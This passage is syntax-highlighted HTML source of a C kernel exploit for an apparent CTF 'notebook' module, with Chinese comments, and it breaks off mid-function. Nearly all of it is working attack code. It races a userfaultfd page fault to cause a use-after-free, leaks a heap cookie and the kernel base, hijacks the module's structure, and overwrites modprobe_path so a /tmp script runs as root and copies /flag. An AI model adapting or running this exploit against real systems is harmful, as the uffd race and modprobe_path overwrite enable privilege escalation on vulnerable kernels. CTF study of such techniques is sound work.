class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> uffd, note_fd;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> fault_page, fault_page_len;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> target, modprobe_path;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> errExit(msg) do&#123;perror(msg);exit(1);&#125;while(0)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> idx;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> size;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> buf;</span><br><span class=\"line\">&#125;userarg;</span><br><span class=\"line\"><span class=\"type\">void</span> _add(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> size, <span class=\"type\">void</span> *buf)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)size;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x100</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> _del(<span class=\"type\">size_t</span> idx)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x200</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> _edit(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">char</span> *buf)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)newsize;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x300</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> _gift(<span class=\"type\">char</span> *buf)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">100</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_to_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\twrite(note_fd, user_buf, idx);<span class=\"comment\">// 逆向 mynote_read可以得到</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\tread(note_fd, user_buf, idx);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">char</span> *buf;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> heap[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> notebook_addr;</span><br><span class=\"line\"><span class=\"type\">char</span> zero[PAGE_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_DATA_SIZE 0x1000000</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tsetvbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tnote_fd = open(<span class=\"string\">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(note_fd &lt; <span class=\"number\">0</span>) errExit(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\">\tbuf = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);<span class=\"comment\">// name的长度</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFILE * stream = popen(<span class=\"string\">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\tassert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tfread(buf, <span class=\"number\">0x10</span> + <span class=\"number\">2</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">\tmod_base_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_add(<span class=\"number\">0</span>, <span class=\"number\">0x60</span> ,zero);<span class=\"comment\">// 0x60 is max size</span></span><br><span class=\"line\">\t_add(<span class=\"number\">1</span>, <span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t_gift(buf);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;note[0] addr is 0x%lx&quot;</span>, *(<span class=\"type\">uint64_t</span> *)buf);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;buf addr is 0x%lx&quot;</span>, buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *ptr = (<span class=\"type\">uint64_t</span> *)buf;</span><br><span class=\"line\">\t<span class=\"comment\">// 获得两个块在堆上的地址</span></span><br><span class=\"line\">\theap[<span class=\"number\">0</span>] = ptr[<span class=\"number\">0</span>];</span><br><span class=\"line\">\theap[<span class=\"number\">1</span>] = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;chunk[0] addr is 0x%lx, chunk[1] is 0x%lx&quot;</span>,</span><br><span class=\"line\">\t\theap[<span class=\"number\">0</span>], heap[<span class=\"number\">1</span>]</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"comment\">// 释放链表 0 -&gt; 1 去获取cookie</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t_del(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t_del(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t_add(<span class=\"number\">0</span>, <span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\t_add(<span class=\"number\">1</span>, <span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\t<span class=\"comment\">// pause();</span></span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, buf);</span><br><span class=\"line\">\t<span class=\"comment\">// Info(&quot;chunk[0]&#x27;s content is 0x%lx&quot;, ptr[0]);</span></span><br><span class=\"line\">\t<span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\">\t\tnext = selfaddr ^ cookie ^ nextaddr</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcookie = nextaddr ^ next ^ selfaddr</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span> </span><br><span class=\"line\">\tcookie = heap[<span class=\"number\">0</span>] ^ heap[<span class=\"number\">1</span>] ^ ptr[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Cookie is 0x%lx&quot;</span>, cookie); </span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;So in this time next should be 0x%lx&quot;</span>, </span><br><span class=\"line\">\t\tcookie ^ heap[<span class=\"number\">0</span>] ^ heap[<span class=\"number\">1</span>]\t</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">/* 到此为止 信息收集基本完成 开始 uffd条件竞争来uaf */</span></span><br><span class=\"line\">\tfault_page = (<span class=\"type\">size_t</span>)mmap(<span class=\"literal\">NULL</span>, <span class=\"number\">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tfault_page_len = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">\tuffd_register();</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, (<span class=\"type\">char</span> *)fault_page);<span class=\"comment\">// 此时卡住 让另外的线程去执行free</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Now free_list maybe look like following:&quot;</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;&gt;&gt;  Chks-&gt;chunk[1]-&gt;chunk[0]-&gt;target  &lt;&lt;&quot;</span>);</span><br><span class=\"line\">\t_del(<span class=\"number\">1</span>);<span class=\"comment\">// chunk[1] -&gt; chunk[0] -&gt; target</span></span><br><span class=\"line\">\t<span class=\"comment\">// 这边最好不要有任何打印操作</span></span><br><span class=\"line\">\t<span class=\"comment\">// 这里至关重要 在notebook上面伪造 cookie ^ selfaddr 作为fd 表示这链表的结束</span></span><br><span class=\"line\">\t*(<span class=\"type\">size_t</span> *)(buf + <span class=\"number\">0xF0</span>) = cookie ^ (mod_base_addr + <span class=\"number\">0x2500</span> - <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *buf2 = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x10</span> ; i++)&#123;</span><br><span class=\"line\">\t\tInfo(<span class=\"string\">&quot;loop %d&quot;</span>, i);</span><br><span class=\"line\">\t\t_add(i, <span class=\"number\">0x60</span>, zero);</span><br><span class=\"line\">\t\t_gift(buf2);</span><br><span class=\"line\">\t\t<span class=\"type\">uint64_t</span> tmp = *(<span class=\"type\">uint64_t</span> *)(buf2 + i * <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(heap[<span class=\"number\">0</span>] == tmp)&#123;</span><br><span class=\"line\">\t\t\tInfo(<span class=\"string\">&quot;Catch it, next is target&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>( i == <span class=\"number\">0xF</span> )&#123;</span><br><span class=\"line\">\t\t\tPanic(<span class=\"string\">&quot;Failure and exit&quot;</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;i is %d&quot;</span>, i);</span><br><span class=\"line\">\t<span class=\"comment\">// 劫持 notebook结构体</span></span><br><span class=\"line\">\t_add(i + <span class=\"number\">1</span>, <span class=\"number\">0x60</span>, buf);</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> PL[] = &#123;</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"comment\">// name field</span></span><br><span class=\"line\">\t\tmod_base_addr + <span class=\"number\">0x168</span>, <span class=\"number\">0x4</span>,<span class=\"comment\">// 泄漏重定位的位置</span></span><br><span class=\"line\">\t\tmod_base_addr + <span class=\"number\">0x2500</span>, <span class=\"number\">0x60</span>,</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\twrite_to_kernel(i + <span class=\"number\">1</span>, PL);</span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, buf);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;offset data is 0x%lx&quot;</span>, *(<span class=\"type\">uint32_t</span> *)ptr);</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> leak = mod_base_addr + <span class=\"number\">0x168</span> + <span class=\"number\">4</span> + *(<span class=\"type\">uint32_t</span> *)ptr;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;leak addr is 0x%lx&quot;</span>, <span class=\"number\">0xffffffff00000000</span> | leak);</span><br><span class=\"line\">\t<span class=\"comment\">// kernel ffffffff81000000 0xffffffff81476c30</span></span><br><span class=\"line\">\tkernel_base_addr = ( <span class=\"number\">0xffffffff00000000</span> | leak ) - <span class=\"number\">0x476c30</span>;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class=\"line\">\tmodprobe_path = kernel_base_addr + <span class=\"number\">0x125D2E0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tPL[<span class=\"number\">0</span>] = modprobe_path;</span><br><span class=\"line\">\tPL[<span class=\"number\">1</span>] = <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">1</span>, PL);</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(buf, <span class=\"string\">&quot;/tmp/exp.sh&quot;</span>);<span class=\"comment\">// 让modprobe执行的脚本</span></span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;echo -e &#x27;#!/bin/sh\\n&quot;</span></span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;/bin/cp /flag /tmp/flag\\n&quot;</span></span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/exp.sh\\n&quot;</span>);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;chmod +x /tmp/exp.sh&quot;</span>);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;echo -e &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    system(<span class=\"string\">&quot;/tmp/dummy&quot;</span>);</span><br><span class=\"line\">\tclose(note_fd);</span><br><span class=\"line\">\tclose(uffd);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_api</span> <span class=\"title\">ua</span>;</span><span class=\"comment\">// io operation api</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_register</span> <span class=\"title\">ur</span>;</span><span class=\"comment\">// io register</span></span><br><span class=\"line\">    <span class=\"comment\">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class=\"line\">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class=\"line\"></span><br><span class=\"line\">\tua.api = UFFD_API;</span><br><span class=\"line\">\tua.features = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class=\"number\">-1</span>) </span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tur.range.start = (<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fault_page;</span><br><span class=\"line\">\tur.range.len   = fault_page_len;</span><br><span class=\"line\">\tur.mode \t   = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">pthread_t</span> thr;</span><br><span class=\"line\">\t<span class=\"comment\">// 注意这里没有-1 pthread create正常返回0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pthread_create(&amp;thr, <span class=\"literal\">NULL</span>, UFFD_handler ,<span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;pthread_create&quot;</span>);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;regitser done&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>&#123;</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;UFFD handler start&quot;</span>);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd %d&quot;</span>, uffd);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffd_msg</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pollfd</span> <span class=\"title\">pollfd</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> nready = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tpollfd.fd\t\t= uffd;</span><br><span class=\"line\">\tpollfd.events\t= POLLIN ;</span><br><span class=\"line\">\tnready = poll(&amp;pollfd, <span class=\"number\">1</span>, <span class=\"number\">-1</span>);<span class=\"comment\">// block here</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(nready != <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;poll&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// put some code you want</span></span><br><span class=\"line\">\t\t_del(<span class=\"number\">0</span>);<span class=\"comment\">// 写没加锁 条件竞争让他free掉</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(read(uffd, &amp;msg, <span class=\"keyword\">sizeof</span>(msg)) != <span class=\"keyword\">sizeof</span>(msg))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;read&quot;</span>);</span><br><span class=\"line\">\tassert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_copy</span> <span class=\"title\">uc</span>;</span></span><br><span class=\"line\">\t<span class=\"comment\">// (mod_base_addr + 0x2500) 是n</span></span><br><span class=\"line\">\t<span class=\"comment\">// 由于条件竞争 接下来的数据写是写到frotebook结构体所在的位置 我们要劫持过去 篡改指针</span></span><br><span class=\"line\">\ttarget = cookie ^ (mod_base_addr + <span class=\"number\">0x2500</span> - <span class=\"number\">0x10</span>) ^ heap[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;target addr is 0x%lx&quot;</span>, target);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> s[<span class=\"number\">2</span>] = &#123;target, <span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\tuc.src \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)s;</span><br><span class=\"line\">\tuc.dst \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)fault_page;</span><br><span class=\"line\">\tuc.len \t= fault_page_len;</span><br><span class=\"line\">\tuc.mode = <span class=\"number\">0</span>;</span><br><span 